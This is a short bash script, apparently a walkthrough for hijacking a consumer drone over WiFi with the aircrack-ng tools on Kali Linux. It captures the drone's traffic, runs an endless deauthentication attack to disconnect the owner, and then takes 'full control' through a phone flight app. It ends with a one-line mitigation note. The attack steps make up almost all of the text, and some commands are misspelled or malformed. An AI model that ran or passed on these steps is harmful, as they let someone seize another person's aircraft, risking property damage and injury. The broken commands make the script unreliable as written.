#!/bin/bash
# use Kali linux; plug in WiFi adaptor (TP-Link TP-WN722N for example) with monitor mode
# wlan1 is the name of your wiFi adaptor. Use ifconfig to check this.

sudo su

airmon-ng start wlan1

airmon-ng check kill

airodump-ng wlan1mon "SSID of target drone" # auto inserion of SSID eg | grep SSID

airodump-ng -c 6 -- bssid "bssid of target drone" -w /root/drone wlan1mon # auto insertion of bssid

# wait for airodump to show data
# open second terminal

airereplay-ng -0 0 -a "bssid" -c "Station" wlan1mon # deauth attack and auto insertion of bssid eg |grep BSSID

# connect with phone for full control. Use drone flight app eg FreeFlight Pro or Freeflight Mini available in Google Play/AppleStore.

# mitigate with strong password
